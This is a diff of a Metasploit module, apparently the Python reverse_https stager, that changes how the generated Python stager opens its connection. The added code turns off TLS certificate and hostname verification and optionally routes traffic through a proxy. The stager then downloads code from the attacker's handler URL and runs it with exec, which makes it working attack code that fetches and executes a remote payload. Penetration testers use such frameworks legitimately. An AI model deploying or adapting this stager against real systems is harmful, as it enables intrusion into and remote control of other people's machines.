@@ -8,7 +8,7 @@ require 'msf/core/handler/reverse_https'
 
 module Metasploit3
 
-  CachedSize = 446
+  CachedSize = 742
 
   include Msf::Payload::Stager
 
@@ -55,18 +55,32 @@ module Metasploit3
     proxy_host = datastore['PayloadProxyHost'].to_s
     proxy_port = datastore['PayloadProxyPort'].to_i
 
-    cmd  = "import sys\n"
     if proxy_host == ''
-      cmd << "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener()\n"
+      urllib_fromlist = "['HTTPSHandler','build_opener']"
     else
+      urllib_fromlist = "['HTTPSHandler','ProxyHandler','build_opener']"
+    end
+
+    cmd  = "import sys\n"
+    cmd << "vi=sys.version_info\n"
+    cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=#{urllib_fromlist})\n"
+    cmd << "hs=[]\n"
+    # Context added to HTTPSHandler in 2.7.9 and 3.4.3
+    cmd << "if (vi[0]==2 and vi>=(2,7,9)) or vi>=(3,4,3):\n"
+    cmd << "\timport ssl\n"
+    cmd << "\tsc=ssl.SSLContext(ssl.PROTOCOL_SSLv23)\n"
+    cmd << "\tsc.check_hostname=False\n"
+    cmd << "\tsc.verify_mode=ssl.CERT_NONE\n"
+    cmd << "\ths.append(ul.HTTPSHandler(0,sc))\n"
+
+    if proxy_host != ''
       proxy_url = Rex::Socket.is_ipv6?(proxy_host) ?
         "http://[#{proxy_host}]:#{proxy_port}" :
         "http://#{proxy_host}:#{proxy_port}"
-
-      cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['ProxyHandler','build_opener'])\n"
-      cmd << "o=ul.build_opener(ul.ProxyHandler({'https':'#{var_escape.call(proxy_url)}'}))\n"
+      cmd << "hs.append(ul.ProxyHandler({'https':'#{var_escape.call(proxy_url)}'}))\n"
     end
 
+    cmd << "o=ul.build_opener(*hs)\n"
     cmd << "o.addheaders=[('User-Agent','#{var_escape.call(datastore['MeterpreterUserAgent'])}')]\n"
     cmd << "exec(o.open('#{target_url}').read())\n"
 
